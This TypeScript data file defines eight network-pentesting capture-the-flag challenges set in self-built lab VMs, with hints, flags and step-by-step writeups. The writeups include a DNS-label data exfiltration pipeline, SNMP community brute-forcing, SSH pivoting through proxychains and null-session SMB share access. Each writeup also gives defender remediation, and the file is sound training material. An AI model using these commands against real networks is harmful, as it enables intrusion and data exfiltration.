import type { CTFChallenge } from '../../../types';

// Network Security & Pentesting Academy — CTF challenges.
// All targets are local, learner-built lab environments (host-only VMs,
// captures the learner generates themselves). Each challenge states exactly
// where the flag is planted in the lab artifact. Flags are literal strings
// compared locally by the platform — no network involved.

export const ctfChallenges: CTFChallenge[] = [
  {
    id: 'net-ctf-01',
    code: 'NETSEC-001',
    title: 'The Silent TXT',
    category: 'Recon',
    difficulty: 'Beginner',
    points: 50,
    objective:
      'Set up a tiny DNS zone on your lab VM and discover the flag planted in a TXT record — recon skill: reading what a zone volunteers.',
    target:
      'Your lab VM (example: 192.168.56.101) running dnsmasq with a local zone you create. Plant the flag yourself: add the line txt-record=secret.lab.local,FLAG{recon_begins_at_dns} to /etc/dnsmasq.conf and restart the service. The flag exists in your own zone file; querying it is the solve.',
    hints: [
      'dnsmasq serves whatever you configure: the txt-record=<name>,<text> line in /etc/dnsmasq.conf is all it takes, then systemctl restart dnsmasq.',
      'Ask the server directly instead of relying on system resolvers: dig @192.168.56.101 secret.lab.local TXT.',
      'Add +short to any dig query to strip the answer down to just the record data.'
    ],
    flag: 'FLAG{recon_begins_at_dns}',
    writeup: [
      'Install and configure: sudo apt install dnsmasq, then add txt-record=secret.lab.local,FLAG{recon_begins_at_dns} to /etc/dnsmasq.conf and sudo systemctl restart dnsmasq.',
      'Verify the service listens: sudo ss -ulpn | grep 53 (DNS answers on UDP and TCP 53).',
      'Query the lab server directly: dig @192.168.56.101 secret.lab.local TXT.',
      'Read the ANSWER SECTION — the TXT string contains the flag.',
      'Understanding: TXT records are routinely used for ownership verification, SPF and service metadata, and they are public by design. Recon means enumerating what a zone volunteers before touching any port.',
      'Remediation (defender view): audit zone contents for anything sensitive, restrict zone transfers, and remember every record is recon material.'
    ],
    relatedLessons: ['n05-l01', 'n05-l02', 'n02-l04']
  },
  {
    id: 'net-ctf-02',
    code: 'NETSEC-002',
    title: 'Anonymous Delivery',
    category: 'Enumeration',
    difficulty: 'Beginner',
    points: 50,
    objective:
      'The flag sits in a file on an anonymous FTP share of your own lab VM. No credentials needed — that is the whole finding.',
    target:
      'Your lab VM (example: 192.168.56.101) running vsftpd with anonymous access enabled. Plant the flag yourself: place a file containing FLAG{anon_ftp_open_for_business} in the anonymous FTP root (example: /srv/ftp/flag.txt, chmod 644).',
    hints: [
      'Confirm the service first: nmap -Pn -p21 192.168.56.101, then check the greeting: nc -nv 192.168.56.101 21.',
      'Anonymous login is the classic: ftp 192.168.56.101, user anonymous, any password. Inside the session use ls and get flag.txt.',
      'No ftp client? curl ftp://192.168.56.101/flag.txt fetches the file directly.'
    ],
    flag: 'FLAG{anon_ftp_open_for_business}',
    writeup: [
      'Prepare the lab: install vsftpd, set anonymous_enable=YES in /etc/vsftpd.conf, restart, and place flag.txt containing FLAG{anon_ftp_open_for_business} in the anonymous root with world-read permissions.',
      'Verify exposure: nmap -Pn -sV -p21 192.168.56.101 shows FTP and its version.',
      'Connect: ftp 192.168.56.101 — log in as anonymous with any password.',
      'List the root (ls) and download: get flag.txt, then quit.',
      'Read the file locally: cat flag.txt — the flag is yours.',
      'Understanding: anonymous FTP hands the world a read (sometimes write) handle into a directory. Anything inside must be treated as published.',
      'Remediation: disable anonymous access unless there is a documented need, keep the root empty of real data, and replace FTP with authenticated, TLS-protected transfer.'
    ],
    relatedLessons: ['n07-l02', 'n10-l04', 'n05-l03']
  },
  {
    id: 'net-ctf-03',
    code: 'NETSEC-003',
    title: 'Self-Incriminating Traffic',
    category: 'Packet Analysis',
    difficulty: 'Intermediate',
    points: 100,
    objective:
      'Generate DNS and HTTP traffic in your own lab, capture it, and recover the flag from the PCAP itself — reading the file from disk does not count, the solve must come from the capture.',
    target:
      'Your host-only lab: a second VM (example: 192.168.56.102) serving a cleartext HTTP site (python3 -m http.server 8000) with the flag planted in a served file (example: secret.txt containing FLAG{cleartext_confession}), plus your attacker VM running tcpdump or Wireshark.',
    hints: [
      'Start the capture before the fetch: tcpdump -i eth1 -n -w netctf03.pcap on the attacker VM.',
      'Fetch the planted file over HTTP: curl http://192.168.56.102:8000/secret.txt — then never touch the file system copy again.',
      'In Wireshark open the PCAP and use http — or tshark -r netctf03.pcap -Y http. The GET response body contains the flag; Follow TCP Stream makes it plain.'
    ],
    flag: 'FLAG{cleartext_confession}',
    writeup: [
      'Plant the artifact: create secret.txt containing FLAG{cleartext_confession} in the web root of the lab web VM and serve it with python3 -m http.server 8000.',
      'Start the capture on the attacker VM: sudo tcpdump -i eth1 -n -w netctf03.pcap.',
      'Generate the traffic: curl http://192.168.56.102:8000/secret.txt (the on-screen output is your confirmation the fetch happened — the solve comes next from the capture).',
      'Stop the capture (Ctrl-C) and analyze: wireshark -r netctf03.pcap or tshark -r netctf03.pcap -Y "http".',
      'Locate the GET /secret.txt request and its 200 response; open Follow > TCP Stream and read the response body — the flag.',
      'Understanding: HTTP without TLS is plaintext on the wire. Anyone with a capture point — the network admin, a compromised switch, the VM host — reads it. Note the DNS query for the host name also rides in the clear.',
      'Remediation: TLS everywhere, HSTS, and treat any credential that ever crossed cleartext HTTP as compromised.'
    ],
    relatedLessons: ['n06-l04', 'n06-l03', 'n06-l01']
  },
  {
    id: 'net-ctf-04',
    code: 'NETSEC-004',
    title: 'Greeting Card',
    category: 'Service Enumeration',
    difficulty: 'Intermediate',
    points: 100,
    objective:
      'A service on your lab VM announces the flag in its pre-auth banner. Banner-grab your way to it — the intended solve is netcat, not reading the config.',
    target:
      'Your lab VM (example: 192.168.56.101) running vsftpd with the flag planted as its greeting: set ftpd_banner=FLAG{banner_says_hello} in /etc/vsftpd.conf and restart the service.',
    hints: [
      'Banners are the first thing a service says when you connect — no credentials, no requests needed.',
      'Connect raw: nc -nv 192.168.56.101 21 and read the very first line the server sends.',
      'Cross-check with nmap -sV -p21 192.168.56.101 — the banner shows up in the service detection output too.'
    ],
    flag: 'FLAG{banner_says_hello}',
    writeup: [
      'Plant the flag: add ftpd_banner=FLAG{banner_says_hello} to /etc/vsftpd.conf on the lab VM and sudo systemctl restart vsftpd.',
      'From the attacker VM, confirm the port: nmap -Pn -p21 192.168.56.101.',
      'Banner-grab by hand: nc -nv 192.168.56.101 21 — the greeting line is the flag. Close with Ctrl-C.',
      'Corroborate: nmap -sV -p21 192.168.56.101 repeats the banner in its fingerprint column.',
      'Understanding: banners are configured strings sent to every unauthenticated connection. They leak product, version and — in deliberately careless setups like this — anything an admin pasted in.',
      'Remediation: keep greetings minimal, strip versions where the product allows, and review banner text in hardening baselines. Banner removal is hygiene; the real fix is patching what the version reveals.'
    ],
    relatedLessons: ['n07-l01', 'n07-l02', 'n05-l03']
  },
  {
    id: 'net-ctf-05',
    code: 'NETSEC-005',
    title: 'Public Knowledge',
    category: 'Misconfiguration',
    difficulty: 'Intermediate',
    points: 150,
    objective:
      'The flag is planted in the SNMP agent of your lab VM as its system location. Find the community string, walk the agent, and read it out.',
    target:
      'Your lab VM (example: 192.168.56.101) running snmpd with a default read-only community (public) and the flag planted as sysLocation in /etc/snmp/snmpd.conf (example: sysLocation FLAG{public_is_not_private}). Lab-only target.',
    hints: [
      'SNMP is UDP 161 — TCP-only scans never see it. Query with snmpwalk -v2c -c public 192.168.56.101 system.',
      'If you do not know the community, brute it: sudo nmap -sU -p161 --script snmp-brute 192.168.56.101.',
      'The system subtree carries sysDescr, sysName, sysContact and sysLocation — the location is where the flag lives.'
    ],
    flag: 'FLAG{public_is_not_private}',
    writeup: [
      'Plant the flag: in /etc/snmp/snmpd.conf on the lab VM set sysLocation FLAG{public_is_not_private}, ensure a rocommunity public line exists, and restart snmpd.',
      'Remember the transport: SNMP speaks UDP 161, so scan with sudo nmap -sU -Pn -p161 192.168.56.101.',
      'Brute or guess the community: sudo nmap -sU -p161 --script snmp-brute 192.168.56.101 reports public as valid (or try snmpwalk with common strings).',
      'Walk the agent: snmpwalk -v2c -c public 192.168.56.101 system > snmp_system.txt.',
      'Read the output — sysLocation.0 contains the flag.',
      'Understanding: default communities are a classic misconfiguration, and SNMPv1/v2c send everything, community included, in cleartext. The agent happily describes the host, its interfaces and more to anyone who guesses one word.',
      'Remediation: replace defaults, move to SNMPv3 auth/priv, and restrict agents to monitoring hosts with firewall rules.'
    ],
    relatedLessons: ['n07-l05', 'n08-l03', 'n05-l05']
  },
  {
    id: 'net-ctf-06',
    code: 'NETSEC-006',
    title: 'DNS Whisperer',
    category: 'Protocol Analysis',
    difficulty: 'Advanced',
    points: 200,
    objective:
      'Reconstruct the flag from a DNS query sequence you captured. The flag travels as subdomain labels of DNS lookups — recover it from the PCAP, not from memory of what you typed.',
    target:
      'Your lab resolver (dnsmasq on 192.168.56.101 from net-ctf-01 works) plus a capture you generate: encode the payload with echo FLAG{dns_tells_everything} | fold -w 8 | sed "s/$/.flag.lab.local/" | xargs -n1 dig @192.168.56.101 +short while capturing port 53 with tcpdump. The PCAP is the artifact.',
    hints: [
      'The payload is split into 8-character chunks and each becomes the leftmost label of a DNS query under flag.lab.local.',
      'Capture first: sudo tcpdump -i eth1 -n -w netctf06.pcap port 53, then run the encode-and-query pipeline, then stop the capture.',
      'Extract just the names from the PCAP: tshark -r netctf06.pcap -T fields -e dns.qry.name | grep flag.lab.local — strip the suffix, concatenate in order.'
    ],
    flag: 'FLAG{dns_tells_everything}',
    writeup: [
      'Start the capture: sudo tcpdump -i eth1 -n -w netctf06.pcap port 53 (or Wireshark with a dns filter).',
      'Run the exfil simulation against your own resolver: echo FLAG{dns_tells_everything} | fold -w 8 | sed "s/$/.flag.lab.local/" | xargs -n1 dig @192.168.56.101 +short.',
      'Stop the capture. Note the answers are NXDOMAIN or empty — exfiltration only needs the queries to leave, not valid answers.',
      'Extract the query names: tshark -r netctf06.pcap -T fields -e dns.qry.name | grep flag.lab.local.',
      'Reassemble: strip .flag.lab.local from each label and concatenate the chunks in capture order — the flag.',
      'Understanding: DNS is a covert channel classic. Queries leave most networks by design, so data can ride out in labels while the answers are irrelevant. Detection keys on unusual label entropy, long names and bursts of lookups to one zone.',
      'Remediation: log and review DNS on a resolver you control, alert on high-entropy subdomains, rate-limit per-client query volume, and consider blocking direct client-to-Internet DNS.'
    ],
    relatedLessons: ['n06-l04', 'n02-l04', 'n06-l02']
  },
  {
    id: 'net-ctf-07',
    code: 'NETSEC-007',
    title: 'Around the Wall',
    category: 'Pivoting',
    difficulty: 'Advanced',
    points: 250,
    objective:
      'The flag is a text file on an internal-only VM you cannot scan or reach directly. Tunnel through the dual-homed pivot and bring it back.',
    target:
      'Three VMs: attacker VM (192.168.56.0/24), dual-homed Ubuntu pivot (192.168.56.105 / 10.10.10.1) with SSH credentials you created, and internal-only VM (10.10.10.20) serving a web root that contains flag.txt with FLAG{the_pivot_is_the_way}. No route exists between 192.168.56.0/24 and 10.10.10.0/24 except the pivot.',
    hints: [
      'Prove the wall first: nmap -Pn -p80 10.10.10.20 from the attacker VM must fail.',
      'One local forward is enough here: ssh -N -L 8080:10.10.10.20:80 labuser@192.168.56.105, then curl http://127.0.0.1:8080/flag.txt.',
      'Prefer a dynamic tunnel so you can also scan the internal host through the same channel: ssh -N -D 1080 labuser@192.168.56.105 plus proxychains4 nmap -sT -Pn -p80 10.10.10.20.'
    ],
    flag: 'FLAG{the_pivot_is_the_way}',
    writeup: [
      'Build the lab: pivot VM with two interfaces (192.168.56.105 and 10.10.10.1), internal VM at 10.10.10.20 with flag.txt (containing FLAG{the_pivot_is_the_way}) in its web root, served by python3 -m http.server 80. Confirm the attacker VM has no route to 10.10.10.0/24.',
      'Confirm isolation: nmap -Pn -p80 10.10.10.20 from the attacker VM times out.',
      'Open the tunnel: ssh -N -L 8080:10.10.10.20:80 labuser@192.168.56.105 and keep the session alive.',
      'Fetch through the tunnel: curl http://127.0.0.1:8080/flag.txt — the flag.',
      'Extend it (optional, the realistic path): tear down the -L, open ssh -N -D 1080 labuser@192.168.56.105, add socks5 127.0.0.1 1080 to /etc/proxychains4.conf.',
      'Enumerate through SOCKS: proxychains4 nmap -sT -Pn -p80 10.10.10.20, then proxychains4 curl http://10.10.10.20/flag.txt.',
      'Understanding: the pivot is the only host on both segments, so every internal packet is relayed by it. A local forward maps one port; a dynamic SOCKS tunnel maps everything — which is why real engagements pivot with dynamic tunnels or TUN-based tools.',
      'Remediation: restrict SSH forwarding on bastions (AllowTcpForwarding, PermitOpen), alert on long-lived SSH control sessions, and monitor cross-segment flows originating from dual-homed hosts.'
    ],
    relatedLessons: ['n13-l02', 'n13-l03', 'n12-l05']
  },
  {
    id: 'net-ctf-08',
    code: 'NETSEC-008',
    title: 'Full Circle',
    category: 'Internal Network',
    difficulty: 'Advanced',
    points: 300,
    objective:
      'The chain: pivot through a dual-homed VM, sweep an internal subnet you cannot see, find the Samba file server, enumerate its shares with a null session, and pull the flag file. Every skill from the labs, one after another.',
    target:
      'Four VMs: attacker VM (192.168.56.0/24), dual-homed pivot (192.168.56.105 / 10.10.10.1, SSH credentials you created), internal web VM (10.10.10.20) and internal file VM (10.10.10.30) running Samba with an anonymous-readable share containing flag.txt with FLAG{null_sessions_never_die}.',
    hints: [
      'Get the dynamic tunnel up first: ssh -N -D 1080 labuser@192.168.56.105, and point /etc/proxychains4.conf at socks5 127.0.0.1 1080.',
      'Sweep through the proxy — connect scans only: proxychains4 nmap -sT -Pn --top-ports 100 10.10.10.0/24. Expect latency; bump timeouts before calling a host dead.',
      'On the file VM: proxychains4 smbclient -L //10.10.10.30/ -N lists shares with a null session, then proxychains4 smbclient //10.10.10.30/<share> -N -c "get flag.txt".'
    ],
    flag: 'FLAG{null_sessions_never_die}',
    writeup: [
      'Build the lab: pivot VM with interfaces 192.168.56.105 and 10.10.10.1; internal web VM 10.10.10.20; internal file VM 10.10.10.30 running Samba with a guest-readable share holding flag.txt (FLAG{null_sessions_never_die}). Verify the attacker VM cannot reach 10.10.10.0/24 directly.',
      'Open the dynamic tunnel: ssh -N -D 1080 labuser@192.168.56.105. Add socks5 127.0.0.1 1080 to /etc/proxychains4.conf and sanity-check with proxychains4 curl -I http://10.10.10.20/.',
      'Sweep the internal subnet: proxychains4 nmap -sT -Pn --top-ports 100 -T4 10.10.10.0/24 — the file VM answers on 139/445.',
      'Enumerate SMB without credentials: proxychains4 smbclient -L //10.10.10.30/ -N lists the shares via a null session; corroborate with proxychains4 enum4linux -a 10.10.10.30 (shares, OS info, users).',
      'Pull the flag: proxychains4 smbclient //10.10.10.30/<share> -N -c "get flag.txt", then cat flag.txt locally.',
      'Confirm the path: on the pivot, ss -tn shows attacker-to-pivot SSH and pivot-to-internal SMB connections — and no direct attacker-to-internal traffic anywhere.',
      'Understanding: this is the internal-network pattern end to end — foothold, relay, discovery through adapted tooling, anonymous-access abuse, evidence retrieval. Segmentation only helps if the boundary host is hardened and monitored.',
      'Remediation: kill null sessions, close guest shares, restrict SSH forwarding on the pivot, and alert on cross-segment SMB from bastion hosts.'
    ],
    relatedLessons: ['n12-l02', 'n12-l05', 'n10-l03', 'n13-l03']
  }
];
